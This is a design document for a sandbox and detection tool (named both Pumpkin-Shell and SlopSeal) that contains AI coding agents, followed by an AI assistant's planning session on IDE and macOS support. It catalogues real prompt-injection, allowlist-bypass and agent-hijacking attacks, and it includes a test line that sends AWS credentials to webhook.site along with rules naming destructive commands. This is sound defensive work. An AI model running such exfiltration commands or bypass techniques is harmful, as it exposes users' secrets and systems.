Pumpkin-Shell v1.0 PRD: Sandbox, Registry Guard, and Tripwires for AI Coding Agents
0. Summary
Pumpkin-Shell is one Rust binary that runs any terminal AI agent (Claude Code, Codex CLI, Gemini CLI, Kiro CLI, Aider, OpenCode) on Linux. It works in three ways:

Removes capabilities. The agent gets no host credentials, no direct network access, and no write access to files that later run on the host.
Guards package installs through a local npm/PyPI mirror. The mirror applies a version cooldown, a malware feed lookup, typosquat checks, and hash verification.
Detects and notifies. Tripwires, exec auditing, and a post-session review flag suspicious behavior and can pause the agent.
Every decision is written to a hash-chained, signed log stored outside the sandbox.

The main pitch to developers: run your agent in full-autonomy mode (--dangerously-skip-permissions, --yolo) safely.

1. Problem: how agents actually break workspaces (research)
#	Technique	Real case	What it teaches
1	Agent edits its own config to turn on auto-approve	GitHub Copilot CVE-2025-53773: a prompt injection writes "chat.tools.autoApprove": true to 
settings.json
, then runs code (Embrace The Red). The researcher also points to 
tasks.json
, added MCP servers, and other agents' config files in the same repo	Agent and IDE config inside the workspace is an attack surface. It must be read-only
2	MCP config written or swapped	Cursor "CurXecute" CVE-2025-54135 and "MCPoison" CVE-2025-54136 (Aim Security, Check Point, 2025)*	.mcp.json and 
mcp.json
 must be protected and scanned
3	Command-allowlist bypass	Claude Code CVE-2025-54795: injection through allowlisted echo "\"; CMD; echo \"" (Cymulate). Gemini CLI allowlist chaining (Tracebit, 2025)*	Parsing shell commands is a losing game. Enforce at the OS level
4	Path-prefix containment bypass	Claude Code CVE-2025-54794: /proj_evil passes startsWith("/proj"), and symlinks extend the escape (same source)	Use mount namespaces, not string checks on paths
5	Malware uses the agents installed on the machine	Nx "s1ngularity" (Aug 2025): a postinstall script ran claude, gemini, and q with --dangerously-skip-permissions, --yolo, and --trust-all-tools to find secrets. It sent them to GitHub through the victim's gh token and appended sudo shutdown -h 0 to ~/.bashrc (Wiz). The malicious versions were on npm for about 4 hours (Nx advisory)	Install scripts, ambient tokens, and rc-file persistence are the real chain. A version cooldown of a few days would have avoided the bad versions entirely
6	Worms that hijack popular packages	chalk/debug compromise and Shai-Hulud 1 and 2 (Sept and Nov 2025)*	A package-age check is not enough. Recent versions of old packages are the risk
7	Hidden instructions in rules files	"Rules File Backdoor" (Pillar Security, 2025)*: invisible Unicode in .cursorrules and Copilot instruction files	Scan agent instruction files for hidden Unicode and changes
8	Destructive operations using credentials already on the machine	Replit agent deleted a production database (July 2025). Amazon Q VS Code extension shipped with an injected "wipe" prompt (July 2025)	The fix is that the agent never holds production credentials, plus a local rollback point
9	Persistence that runs later, outside the sandbox	.git/hooks, core.fsmonitor and core.hooksPath in .git/config, .husky/, .envrc, .yarnrc.yml yarnPath, 
tasks.json
 with runOn: folderOpen, CI workflows, conftest.py, and user-level agent settings such as ~/.claude/settings.json hooks	The sandbox boundary has to include files written now that execute later
10	Exfiltration through side channels	DNS, unset HTTPS_PROXY, raw sockets, cloud metadata at 169.254.169.254, and allowed domains (gists, the model API)	Network namespace with no route out. Allowed domains remain a documented residual risk
* From prior knowledge, not re-checked this session. The execution step will verify each source before the PRD is final.

2. Users and their real pain points
Solo or startup developer running agents in full-autonomy mode. Pain points: approval fatigue, fear of rm -rf, and leaked .env files. They won't accept a tool that breaks npm install.
DevOps or platform engineer. Pain points: agents near kubectl, terraform, and ~/.aws, and AI-written CI workflows.
Security lead. Needs evidence of what agents did, a policy shared across the team, and checks in CI.
Adoption rule: if SlopSeal breaks the normal workflow even once, users uninstall it. Every block must tell the user exactly which policy line to add to allow it.

3. Threat model
Attackers:

(A1) A prompt-injected agent, injected through repo files, web pages, issues, or MCP output.
(A2) A malicious dependency or install script.
(A3) A well-meaning agent that hallucinates or deletes things.
(A4) Malware that drives the agent CLIs already installed.
Assets: SSH, cloud, git, and npm credentials; source code; the integrity of files the host executes later; production systems; the SlopSeal log.

Trust boundary: everything inside the sandbox runs as the user but is untrusted. The host-side SlopSeal process is trusted.

Out of scope for v1:

Kernel and bubblewrap zero-days.
Malware already running on the host outside SlopSeal.
Exfiltration through domains the user allowed (the model API, gists). This is documented as a residual risk.
The content quality of AI-written code (SAST).
4. Design principles
Remove capabilities rather than detect intent. No credentials means no damage. Matching command arguments is detection only, never the security boundary.
All authority sits on the host side. The policy, the signing key, the log, the network proxy, and the exec supervisor all live outside the sandbox.
Fail closed, out loud. If the proxy dies, the sandbox has no network. If the supervisor dies, the session is killed and a CRITICAL alert fires.
Low friction by default. Too-new versions are hidden rather than causing install errors. Unknown domains trigger an "ask" prompt. Every block message includes the policy line that would allow it.
Honest claims. Release notes say "N/N escape tests pass on corpus vX". They never say "0% bypass".
5. v1 scope
In scope:

Linux x86_64 and aarch64.
Terminal agents, including ones started from the integrated terminal of VS Code, Cursor, or Kiro.
slopseal scan, which also protects IDE-agent users without a sandbox.
npm-registry clients (npm, pnpm, yarn, bun) and PyPI clients (pip, uv, poetry).
Not in v1:

Wrapping full IDE GUIs.
macOS (planned for v1.1 using sandbox-exec).
Windows (planned for v1.2 through WSL2).
Cargo and Go registries.
TLS inspection.
Swapping credentials in the proxy.
6. Functional requirements
FR-SBX: Sandbox (bubblewrap plus Landlock plus seccomp, no root)
--unshare-all --die-with-parent --new-session --cap-drop ALL, a fresh /proc, and --disable-userns (nested sandboxes off by default; a profile can opt in).
The root filesystem is read-only. The repository is read-write. $HOME is a tmpfs containing only the agent profile's directories.
These are never mounted: $SSH_AUTH_SOCK, the D-Bus session bus, docker.sock, X11/Wayland sockets, and /run/user/$UID.
The environment is reduced to an allowlist. The profile adds only its own API key variable.
A Landlock layer applies when the kernel supports it (write access limited to the repo, tmpfs home, and /tmp; TCP limited to loopback on ABI v4 and later). On older kernels it is skipped with a warning.
When the session ends, the whole process tree is killed. Processes that were still running are reported.
FR-NET: Egress
The sandbox has loopback only. An in-sandbox relay on 127.0.0.1:8899 forwards to a host Unix socket. DNS never leaves the sandbox; the proxy resolves names itself.
A CONNECT allowlist by host:port. The proxy resolves the name and then refuses private, link-local, and metadata IP ranges, which blocks DNS rebinding and SSRF to the LAN.
Unknown domains use ask mode: the connection is held for 20 seconds, a desktop notification appears, and the user can run slopseal allow <id> [--always]. Headless or CI sessions use deny.
Optional relays to host services such as host_ports = [5432] for a local Postgres, logged as a notice.
Per-host upload byte counters feed the large-upload detection rule.
FR-REG: Registry guard (local mirror over plain HTTP inside the sandbox, rustls upstream)
The sandbox gets npm_config_registry, PIP_INDEX_URL, and UV_INDEX_URL pointing at the mirror. Direct CONNECT to registry hosts is blocked.
Version cooldown (default 72 hours). Versions newer than the cooldown are removed from the npm packument (package metadata) and the PyPI index, so the package manager resolves the previous version on its own. A lockfile pinned to a too-new version is blocked with an explanation.
Packages whose first release is under 30 days old are blocked. A missing package (404) is logged as a hallucinated package.
OSV.dev lookups for MAL- advisories, cached. If OSV is unreachable, packages older than 30 days are allowed and newer ones are blocked.
Typosquat checks use normalized names and bundled top-download lists. Edit distance 1 for names of 5+ characters, distance 2 for 10+. Default is WARN. It becomes BLOCK when the package is also young or has few downloads.
Tarballs and wheels are downloaded to the cache, checked against dist.integrity or the sha256, and only then served.
npm_config_ignore_scripts=true by default. Packages flagged hasInstallScript are listed in the session summary. PIP_ONLY_BINARY is optional.
FR-WS: Workspace integrity (persistence defense)
Read-only bind mounts when the path exists:
.git/hooks and .git/config
the core.hooksPath target (for example .husky/)
.envrc, .yarnrc.yml, the repo-level .npmrc
.vscode/, .cursor/, .claude/, .kiro/, .mcp.json
slopseal.toml
the user-level settings and hooks files of each agent profile
Paths that don't exist yet can't be bind-mounted. Instead, the host process watches the repo with inotify. If any protected name is created, it raises a CRITICAL alert and moves the file into .slopseal/quarantine/ before host tools can pick it up.
Watched files may be edited but are always shown in the review: .github/workflows/, package.json scripts and URL/git dependencies, Makefile, Dockerfile, .devcontainer/, conftest.py, setup.py, the pyproject build backend, .pre-commit-config.yaml, and agent instruction files (CLAUDE.md, AGENTS.md, .cursorrules, .kiro/steering).
Rollback point. Before launch, the host process commits the working tree, including untracked files that aren't gitignored, using a temporary index. It bundles all refs to ~/.local/share/slopseal/snapshots/<sid>.bundle. slopseal restore <sid> recovers it.
Decoy credentials. Fake ~/.ssh/id_ed25519, ~/.aws/credentials, and ~/.config/gh/hosts.yml are placed in the tmpfs home, each containing a unique marker. Users can optionally supply their own canarytokens.
FR-DET: Detection engine
Event sources:

The proxy and the registry mirror.
A seccomp user-notification supervisor on the host for execve and connect. It runs in observe-only mode using SECCOMP_USER_NOTIF_FLAG_CONTINUE, and the listener file descriptor is passed to the host over SCM_RIGHTS.
Host-side inotify on the repo.
A decoy watcher inside the sandbox. If it dies, a CRITICAL alert fires and the session is killed.
Session lifecycle events.
Argument matching on exec is detection only, because reading arguments this way can race with the process.

Detection rules:

Rule	Trigger	Severity
REG-MALWARE	OSV MAL- match	CRITICAL, blocked
REG-INTEGRITY	Hash mismatch	CRITICAL, blocked
REG-TOO-NEW / REG-COOLDOWN	Young package / version hidden by the cooldown	HIGH / INFO
REG-HALLUCINATED	Package doesn't exist (404)	WARN
REG-TYPOSQUAT	Close to a popular package name	WARN or BLOCK
REG-DIRECT-BYPASS	CONNECT straight to a registry host	HIGH, blocked
NET-UNKNOWN-DOMAIN	Domain not on the allowlist	WARN, held for approval
NET-PRIVATE-IP	Name resolves to a LAN or metadata address	HIGH, blocked
NET-DIRECT-CONNECT	connect() to a non-loopback address (a tool ignoring the proxy, or evasion)	WARN, with a fix hint
NET-LARGE-UPLOAD	More than 10 MB uploaded to a host other than the model API	WARN
NET-DECOY-EGRESS	Decoy marker seen in plain-HTTP traffic	CRITICAL
FS-DECOY-READ	A decoy credential file was opened	HIGH
WS-PROTECTED-CREATE	A protected file was created	CRITICAL, quarantined
WS-AUTOAPPROVE	chat.tools.autoApprove, a broad Bash allow rule, or a new MCP server	CRITICAL
WS-HIDDEN-UNICODE	Unicode tag characters (U+E0000–E007F), bidi controls, or zero-width characters in instruction or config files	HIGH
WS-WATCHED-CHANGE	CI, build, or install-hook files changed	HIGH (shown in review)
WS-SECRET-WRITTEN	A secret pattern appears in the diff	HIGH
WS-MASS-DELETE	More than 50 files or more than 20% of tracked files deleted	HIGH, with the restore command
EXEC-AGENT-YOLO	An agent CLI started with skip-permission flags by a non-interactive parent (the s1ngularity pattern)	CRITICAL
EXEC-DESTRUCTIVE	terraform apply -auto-approve or destroy, kubectl delete, helm uninstall, aws … delete-*, git push --force, DROP or TRUNCATE	HIGH
EXEC-RECON	trufflehog, or credential searches through home directories	HIGH
SBX-MONITOR-LOST	The supervisor or decoy watcher died	CRITICAL, session killed
POL-UNTRUSTED	The repo policy changed after slopseal trust	WARN, any loosening ignored
FR-NOTIFY: Notification and response
INFO and NOTICE go to the log and the session summary.
WARN shows in the live slopseal watch view, a second terminal pane. SlopSeal never writes into the agent's terminal UI.
HIGH also sends a desktop notification through notify-send.
CRITICAL also posts to a webhook (Slack, Discord, or generic JSON) and runs the configured on_critical action. The default is pause: SIGSTOP the whole sandbox until slopseal resume or slopseal kill.
Repeated events are deduplicated by rule and target. Desktop notifications are capped at one every 10 seconds, with the rest grouped together.
At exit, a summary prints after the agent's terminal UI closes. slopseal review shows a full report: blocks, the watched-file diff, quarantined files, and restore instructions.
FR-POL: Policy
The user policy lives in ~/.config/slopseal/policy.toml and is never mounted into the sandbox.
The repo's slopseal.toml can only make rules stricter. Loosening requires slopseal trust, which pins the file's hash.
Agent profiles define directories, read-only files, egress domains, and environment keys. Profile domain lists are captured by running each agent in monitor mode and then reviewed. They are not guessed.
monitor mode applies all the filesystem protections but only logs network decisions. slopseal policy suggest turns a monitor session into allowlist lines.
FR-RCPT: Signed log
JSONL records with seq, prev hash, policy_hash, rule, verdict, and an ed25519 signature.
The key lives in ~/.local/share/slopseal/. A signed checkpoint at session end makes it possible to detect a truncated log.
slopseal log verify checks the chain, signatures, and checkpoint. Optional forwarding to a file or webhook gives a copy off the machine.
CLI
doctor, init, run [--profile P] -- <cmd>, watch, allow, resume, kill, review, restore, scan [--ci], trust, policy suggest, log [verify], test (runs the escape-test corpus locally).

7. Developer scenarios (acceptance tests)
Ubuntu 24.04 blocks unprivileged user namespaces through AppArmor. doctor explains the cause and gives the exact fix.
A dependency publishes a malicious version 2 hours ago (the nx pattern). The mirror hides it, npm installs the previous version, and a notice is logged.
The agent runs pip install langchain-core-utils-v2. If it doesn't exist: 404 and a WARN. If an attacker registered it 3 days ago: blocked with a HIGH alert.
A README injection tells the agent to enable auto-approve. If .vscode exists, the write fails because it's read-only. If it doesn't exist, the created file is quarantined and a CRITICAL alert fires.
The agent runs curl -d @~/.aws/credentials https://webhook.site. It reads a decoy (HIGH), and the domain is held for approval and then denied.
The agent needs a local Postgres. NET-DIRECT-CONNECT fires with the hint host_ports = [5432].
The agent runs rm -rf src/. WS-MASS-DELETE fires, and slopseal restore recovers the files.
A DevOps agent runs terraform apply. It has no credentials, so it fails safely. With the opt-in DevOps profile and plan-only credentials, EXEC-DESTRUCTIVE sends a desktop alert.
A postinstall script tries claude --dangerously-skip-permissions. Install scripts are skipped. If scripts are enabled, EXEC-AGENT-YOLO fires a CRITICAL alert and the session pauses.
A pull request adds hidden Unicode to AGENTS.md. slopseal scan --ci fails the GitHub Actions check.
8. Non-functional requirements
No root at runtime. Requirements: kernel 5.13 or later (6.7+ recommended), bubblewrap 0.8 or later, and seccomp user-notification CONTINUE support (kernel 5.5+).
Performance targets:
Startup overhead under 300 ms.
Exec auditing overhead under 5% on a mid-size npm test run.
Mirror latency under +15% with a warm cache.
Works offline from the cache.
No telemetry.
SlopSeal's own supply chain: cargo-deny, cargo-audit, cargo vet, signed releases (cosign), SLSA provenance, and no curl | sh installer.
Supported distributions: Ubuntu 22.04 and 24.04, Debian 12, Fedora 41, Arch.
9. Success metrics
100% of the escape-test corpus passes on every release.
At most one HIGH false positive per 8-hour dogfooding session.
Installing the top 50 npm and PyPI projects works without manual policy edits.
A new user reaches a first protected session in under 5 minutes.
10. Residual risks (documented publicly)
Exfiltration through allowed domains.
Kernel or bubblewrap escape bugs.
Code the agent writes that the user later runs outside SlopSeal.
Same-user signatures are tamper-evident only against the sandbox, not against the user or other malware running as the user.
Exec argument detection can be evaded. The real control is that credentials are absent.
11. Build plan (test-driven; each task can be demonstrated)
Task 1: Workspace, CI, and slopseal doctor

Objective: set up the Cargo workspace (cli, sandbox, proxy, registry, detect, receipts, policy) and CI with clippy, cargo-deny, and cargo-audit.
Guidance: doctor probes the kernel version, the bubblewrap version, whether user namespaces are allowed (including the Ubuntu AppArmor restriction), the Landlock ABI, and seccomp user-notification support.
Tests: unit tests on parsing the probe results.
Demo: slopseal doctor prints pass or fail for each item, with fixes.
Task 2: Policy model and init / trust

Objective: parse TOML policy files and merge them so the repo policy can only tighten rules, with hash pinning.
Tests: property tests showing a repo policy can never loosen rules.
Demo: slopseal init writes the policy and prints what is protected.
Task 3: slopseal scan

Objective: detect hidden Unicode, auto-approve settings, MCP servers, tasks.json folderOpen entries, and yarnPath, with a --ci exit code.
Tests: a fixture repository for each rule.
Demo: scan a poisoned fixture repo and get the expected CRITICAL and HIGH findings. This is useful to IDE users on day one.
Task 4: Signed log

Objective: the hash chain, ed25519 signatures, checkpoints, and log verify.
Tests: tampering with, deleting, reordering, or truncating records is detected.
Demo: emit events from the CLI, edit a line, and watch verification fail.
Task 5: slopseal run, minimal sandbox

Objective: bubblewrap with a read-only root, read-write repo, tmpfs home, reduced environment, no network, and process-tree kill at exit. Session events go to the log.
Tests: escape tests FS-01, ENV-01, IPC-01 to IPC-04, PROC-01 and PROC-02 in CI.
Demo: slopseal run -- bash, where cat ~/.ssh/id_ed25519 and $SSH_AUTH_SOCK both fail.
Task 6: Workspace integrity

Objective: read-only bind mounts (including the core.hooksPath target), host inotify with quarantine, the rollback snapshot with restore, and decoys with the decoy watcher.
Tests: FS-02 to FS-05 and WS-PROTECTED-CREATE; restore round-trips the working tree.
Demo: try to write a git hook (fails), create .envrc (quarantined), run rm -rf src and then restore.
Task 7: Egress proxy and relay

Objective: host proxy on a Unix socket with the in-sandbox relay, CONNECT allowlist, private-IP blocking, ask/deny/allow modes, slopseal allow, and byte counters.
Tests: NET-01 to NET-07 (including the metadata address and DNS).
Demo: inside the sandbox, curl to an allowed domain works and an unknown domain prompts for approval.
Task 8: Notification pipeline

Objective: the severity engine, deduplication, watch, desktop notifications, webhooks, pause/resume/kill, the exit summary, and review. Wire in all existing event sources.
Tests: rate-limit and deduplication unit tests; pause freezes the whole process tree.
Demo: reading a decoy triggers a desktop notification, and a CRITICAL event pauses the agent.
Task 9: npm mirror

Objective: packument rewriting, cooldown filtering, package-age check, 404 handling, integrity checks, cache, and ignore-scripts.
Tests: REG-01, REG-02, REG-04, REG-05, and NET-06 against a local fake registry.
Demo: a version published "2 hours ago" is hidden and npm installs the previous one.
Task 10: PyPI mirror, OSV, typosquat

Objective: the PEP 691 index and file filtering, OSV batch lookups with cache, and the typosquat rules.
Tests: REG-03, a false-positive benchmark against the top 1,000 packages, and the uv and pip paths.
Demo: a malicious package fixture is blocked with a CRITICAL alert.
Task 11: seccomp supervisor and Landlock

Objective: observe-only execve and connect notifications handled on the host, the EXEC-* and NET-DIRECT-CONNECT rules, and the Landlock layer.
Tests: the performance budget, that the session is killed when the supervisor or watcher dies, and the EXEC-AGENT-YOLO fixture.
Demo: terraform destroy inside the sandbox triggers a HIGH desktop alert.
Task 12: Agent profiles and end-to-end scenarios

Objective: profiles for claude, codex, gemini, kiro-cli, aider, and opencode, with domain lists captured in monitor mode, plus policy suggest.
Tests: the 10 scenarios in section 7 as automated end-to-end tests.
Demo: Claude Code in full-autonomy mode completes a real task inside the sandbox.
Task 13: v1.0 release

Objective: signed builds, SLSA provenance, documentation including the threat model and residual risks, the published escape-test corpus, and AppArmor guidance.
Demo: a clean install and first protected session in under 5 minutes on each supported distribution.
Estimate: about 6 to 7 weeks for one experienced Rust and Linux engineer. Task 3 (scan) can ship as an early v0.1 in the first week.

Execution scope if you approve: write SLOPSEAL_PRD_v1.md from the draft above, check the sources marked with *, and add a THREAT_MODEL.md. Building the product is a separate step you would approve later.

Defaults I chose: 72-hour version cooldown, typosquat set to WARN, nested sandboxes off, and npm install scripts off.

[1]: What should happen when an agent contacts a domain that isn't on the allowlist? a. Ask (my default): hold the connection for 20 seconds and send a desktop notification. Least friction, but the user has to respond. b. Deny: the strictest option. Users have to edit the policy more often.

[2]: What should SlopSeal do on a CRITICAL detection? a. Pause (my default): freeze the agent until you resume or kill it. Safe, and no work is lost. b. Kill: end the session immediately. c. Alert only: notify and let the agent keep running.

[3]: Should github.com be reachable from inside the sandbox by default? a. Read-only in practice: allowed over HTTPS, but no credentials are passed in, so the agent can clone but not push. Pushes happen outside SlopSeal, which keeps a human in the loop. b. Off: the user adds it per project. c. Full: pass a scoped token in.

Does this plan look good, or would you like me to adjust anything?

Est. Credits Used: 7.74
Elapsed time: 6m


Checkpoint
Restore
what if we 1st for kiro ide first or other ide if simillar? and we have linux and mac support?

Kiro

Thought complete
I need to think about IDE-first support for Kiro IDE plus Linux and macOS compatibility. Kiro is a VS Code fork (Code OSS) built by AWS on Electron, where the agent executes terminal commands through the integrated terminal and writes files via extension host APIs, with MCP configuration located at .kiro/settings/mcp.json and in the ~/.kiro/ directory. I'm also considering that Kiro has steering files, agent hooks that trigger on file events (another persistence vector worth flagging), and likely some trusted-commands setting, though I'm not certain of the exact naming so I should mark those as unverified. The bigger technical challenge is that sandboxing the whole IDE means sandboxing the human's environment too — extensions, git credentials, SSH, settings sync, OAuth logins that need a system browser (blocked without D-Bus/xdg-open), GPU access, and the X11/Wayland socket situation where X11 risks keystroke injection while Wayland is safer. Electron's own sandbox relies on setuid chrome-sandbox or nested user namespaces, so I either need nested userns support or have to drop to --no-sandbox and lose the renderer sandbox, plus Electron still needs /dev/shm, GPU access, fonts, and D-Bus for secret storage since Kiro's login tokens are likely stored via keytar/libsecret — without D-Bus, VS Code typically falls back to an insecure plaintext storage method. One workaround is giving the IDE its own persistent sandboxed home directory as a separate profile, though that means users lose their normal config and need an import path. I'm also thinking about a split-trust architecture where the IDE UI stays unsandboxed but agent actions themselves are sandboxed — for terminal commands this could work by setting the IDE's default/automation terminal profile to route through the sandboxed shell, but the real problem is that the agent's file-write tool runs in the unsandboxed extension host process, meaning it could just edit user settings directly to escape that constraint. So this split mode only really covers terminal commands — file writes and MCP servers spawned from the extension host are still exposed, though MCP commands could potentially be wrapped depending on config. That leaves the more honest option of a full IDE sandbox profile running the entire application inside SlopSeal, which creates a much stronger boundary but requires solving persistent sandbox homes, Wayland support, nested user namespaces for Electron's sandbox, a mediated URL-opening broker for login flows, and some path for git push — this seems feasible on Linux, while macOS introduces its own complications since `open`/LaunchServices launches apps via launchd rather than as a child process, letting them escape sandbox-exec confinement. On macOS, the workaround is to exec the binary directly rather than going through `open`, and network can be restricted to a localhost proxy port using Seatbelt rules the same way Claude Code does, with Electron's helper processes inheriting the sandbox since they're spawned as children and Chromium's own nested seatbelt layering on top. Keychain access remains a moderate risk since allowing mach-lookup to securityd for token storage could expose other apps' keychain items, though ACLs per-app should mitigate this — flagging this whole macOS path as something that needs a dedicated spike to validate. I also need to account for AppleEvents and `open`/LaunchServices as sandbox escape vectors (controlling Terminal or launching other apps outside the sandbox), plus LaunchAgents persistence, pasteboard access, and TCC — these are the macOS analogs of the D-Bus/systemd-run risks I identified on Linux. Then there's the alternative "agent-only sandbox inside the IDE" approach: wrapping the terminal and MCP servers, scanning the workspace, and setting a proxy in IDE settings — but this is weak against extension-host file writes and would need host-side file watching to detect violations. Given that, B is really "protect + detect" rather than true containment, so my recommendation is to make full sandboxed IDE sessions (option A) the v1 approach, keeping B-lite elements like scanning and host watching always on. Since VS Code, Cursor, Windsurf, and Kiro are all Code-OSS forks, I can build one shared profile with per-fork config paths rather than four separate implementations — Zed and JetBrains would need their own handling later. The hard problems to solve for IDE mode start with Electron/Chromium's sandbox conflicting with bubblewrap's nested user namespaces, since VS Code's chrome-sandbox setuid binary won't work under no_new_privs. Flatpak solves this with zypak since Flatpak blocks nested userns, but bubblewrap without disabling userns should allow nesting. Beyond that, display access needs to be restricted to Wayland (X11 exposes keystrokes session-wide, so I'd warn and require opt-in there) plus GPU device access, and OAuth login flows are tricky since Kiro's browser-based sign-in redirects to a localhost callback that needs a port relay between the host and the sandboxed network namespace — plus a URL broker so xdg-open calls inside the sandbox can actually open the host browser. For persistent state, each IDE needs its own sandboxed home directory that persists across runs, with an import command to copy over settings and extensions but never credentials. The tricky part is protecting files that could steer the agent, like MCP config or trusted-command settings, while still letting users edit normal preferences through the UI — I'm leaning toward keeping settings.json writable but having a host-side watcher diff security-relevant keys on each change. Extensions get downloaded through the proxy from the marketplace and run inside the extension host, so they're contained by the sandbox; I could add publisher/age vetting later. For git, since the sandbox has no credentials, I'd want a host-side credential broker: the sandboxed git calls out over a socket, and the host prompts the user to approve each push to a specific repo/branch. For v1, this would only support HTTPS git with per-push approval — SSH agent forwarding is harder to mediate per-operation, so I'd leave it unsupported for now. Terminals inside the IDE already run inside the sandbox, which keeps things contained. For Kiro specifically, I'm thinking about agent hooks (.kiro/hooks) that fire on file save — these are a real persistence/injection risk — along with steering files and specs, so I'd want hooks and settings treated as read-only. For macOS, sandbox-exec/Seatbelt is the right mechanism, similar to what Chrome, Claude Code, and Codex CLI already use, with a deny-by-default policy restricting file reads outside the workspace. Actually, Seatbelt's file-write deny rules can block even nonexistent paths, which is stronger than Linux for protecting against creation — that's a real advantage. For exec auditing though, macOS lacks seccomp-equivalent visibility; Endpoint Security would need Apple entitlement approval and a root system extension, which isn't viable for v1. Instead I'm thinking process polling or kqueue's EVFILT_PROC with NOTE_FORK/NOTE_EXEC could track a process tree unprivileged for the user's own processes, though it's racy for short-lived processes. Seatbelt denials can also be logged via unified logging, and `log stream` seems readable by regular/admin users without root — worth marking as a spike to verify. For OS parity, I'll treat EXEC-* rules as best-effort. On decoys, since apps using getpwuid or NSHomeDirectory can still resolve the real home even if HOME is redirected, I should explicitly deny reads of real secret paths like ~/.ssh via Seatbelt subpath rules, and place decoys in the redirected home instead. For networking, Seatbelt can restrict outbound connections to localhost only and deny mDNSResponder mach-lookup so apps can't resolve DNS directly, forcing everything through the proxy — this seems to be how srt handles it, and it should work fine. Apps that ignore the env proxy settings will simply fail closed, same as on Linux. For the IDE on Mac, I need to launch the Kiro binary directly rather than through `open`, but Electron under sandbox-exec is tricky since Chromium runs its own nested sandbox_init calls for helper processes — neither Codex nor Claude sandbox GUIs this way, so this is a real risk requiring a spike task. I also need to decide on the auto-updater: Squirrel.Mac's ShipIt runs via launchd outside the sandbox, which is legitimate but should probably be denied within the sandbox context, letting users update separately. Keychain access for login tokens will need mach-lookup allowed for securityd, with the residual risk being that an agent could request keychain items scoped only to Kiro's code signature. Since the sandboxed process is still Kiro's own binary, items it creates remain accessible to it while other apps' keychain items would still prompt the user — acceptable, but worth documenting. For distribution, I'll need a signed and notarized binary via Apple Developer ID for Gatekeeper, plus a Homebrew tap. I'm noting that sandbox-exec is technically deprecated by Apple but still widely relied upon by Chrome, Bazel, Codex, and Claude, so it's a reasonable risk to accept. Looking at timeline, going IDE-first adds significant scope — Electron-in-bwrap, Wayland/GPU handling, URL broker, port relay for OAuth callbacks, persistent home with import, guarded settings keys, and a git credential broker — while macOS requires building an entirely separate sandbox backend with weaker detection capabilities. My rough estimate is 6-7 weeks for Linux CLI, another 3-4 for Linux IDE, and about 4 more for macOS, totaling 12-14 weeks for one engineer. To ship faster, I'm considering phasing: v0.1 as a portable Rust scanner that works everywhere immediately, then v0.2 for Linux CLI+IDE, then v0.3 for macOS — or alternatively going IDE-first. I'm realizing IDE-first doesn't really require CLI first, since the IDE mode is just a profile layered on the same core sandbox — so the better framing is: build the core sandbox, then the Kiro IDE profile on Linux, then the macOS backend, with CLI profiles coming nearly for free afterward. Architecturally I'm sketching a sandbox backend trait with separate Linux (bwrap+landlock+seccomp) and Mac (seatbelt) implementations, sharing common components like the proxy, registry, detection, receipts, policy engine, host watcher (using the `notify` crate for cross-platform inotify/FSEvents), and the URL/git-credential/port-relay brokers — plus a capability parity table comparing Linux and macOS. I'm narrowing down to three key open questions: whether IDE mode should sandbox the full IDE or use a split mode, whether Kiro plus VS Code and Cursor should all be in v1 or just Kiro first, and whether macOS ships in v1.0 or follows four weeks later in v1.1 — while making sure not to lose track of the earlier open questions by consolidating them. Before finalizing, I want to verify some Kiro-specific facts by checking the official docs on hooks and MCP, so I'll do a quick fetch of kiro.dev/docs to ground these paths in reality.

3 tool calls
Fetch URL
https://kiro.dev/docs/hooks/
Fetch URL
https://kiro.dev/docs/getting-started/installation/
Fetch URL
https://kiro.dev/docs/mcp/configuration/

Thought complete
I'm noting key Kiro facts: MCP config lives in workspace or user settings with hot-reload on save, and hooks stored as JSON files can run shell commands automatically, including a global hooks location. Kiro also respects proxy env vars and has a firewall allowlist doc for egress domains, plus Linux/macOS support details and browser-based sign-in. I should quickly fetch that firewall allowlist page to pull the actual domain list.

1 tool call
Fetch URL
https://kiro.dev/docs/privacy-and-security/firewalls/

Thought complete
I'm also noting that Kiro's sign-in uses the system browser outside the sandbox, which is fine through the URL broker, but allowlisting all of *.amazonaws.com would be risky since it could allow exfiltration to any S3 bucket—better to allowlist exact hosts only. There's still the exfil risk through the model API itself to consider when I write the answer. Now I'm structuring the response: confirm it's doable since Kiro, VS Code, Cursor, and Windsurf share the Code-OSS lineage so one adapter family can cover them, but explain that an IDE-first approach means sandboxing the whole IDE rather than just the agent, and that split mode isn't actually secure because of the extension host. I also want to lay out what a full-IDE sandbox requires, Kiro's specific attack surface, the macOS parity gaps, an updated architecture diagram, a revised task list with objectives/guidance/tests/demos, updated timeline estimates (roughly 12-14 weeks for one engineer covering Linux and macOS versus the original 6-7 weeks), and closing questions about whether the plan looks good. De-risking the two biggest unknowns early — running Electron under sandbox-exec on macOS and under bwrap on Linux — by scheduling spike tasks before committing to the full build. For the macOS sandbox specifics, I'm working out the Seatbelt profile details: launching the IDE binary directly rather than through `open` so it doesn't escape the sandbox via LaunchServices, denying file access to sensitive directories like SSH/AWS/keychain/gh config, blocking writes outside the repo and IDE directories, protecting shell rc files and git config, and restricting network access to only the local proxy port while denying mDNS lookups. I'm also considering AppleEvents and lsopen denial to prevent escape via Terminal automation, allowing pasteboard and keychain access as residual risk since they're needed for normal use, and thinking through detection gaps — no seccomp equivalent means I'd rely on unified log violation reports and process tree polling via kqueue, with Endpoint Security as a future option requiring special entitlements. For decoys, since HOME redirection doesn't work reliably for GUI apps, I can get an equivalent effect by denying reads to real sensitive paths and treating the resulting violation log as the decoy trigger. Rounding out the plan with FSEvents-based host watching, git snapshots, and Developer ID signing plus notarization for distribution via Homebrew. On the Linux side, I'm working through Electron sandbox requirements like nested user namespaces, restricting display access to Wayland-only with X11 requiring explicit opt-in due to its weak isolation, and avoiding unnecessary device/audio access. For auto-update and D-Bus, updates get blocked by write-denial rules so users must update outside the sandbox, and I'm planning to use xdg-dbus-proxy to filter D-Bus access while denying Secret Service (since it exposes the whole keyring) in favor of a basic password store confined to the sandboxed home directory. I'm figuring out URL opening and OAuth callback handling — using a broker that auto-allows known auth domains and denies file:// URLs, plus a host-to-sandbox port relay so browser-based sign-in redirects to localhost can reach the sandboxed app, which needs validation in a spike. I'm also sketching persistent sandbox homes for IDE imports (copying settings and extensions but not tokens) and a host-side watcher that diffs sensitive config files like MCP auto-approve settings and new hooks to catch risky changes. For responding to tampering: revert to the last approved config version, flag it critical, and let the user approve via a command if intentional. Since Kiro hot-reloads MCP config there's a race where a malicious server could start before the revert lands, but because everything the IDE spawns stays inside the sandbox, that's contained -- the real risk is persistence into unsandboxed launches, i.e. if the user later opens Kiro outside SlopSeal and the tampered 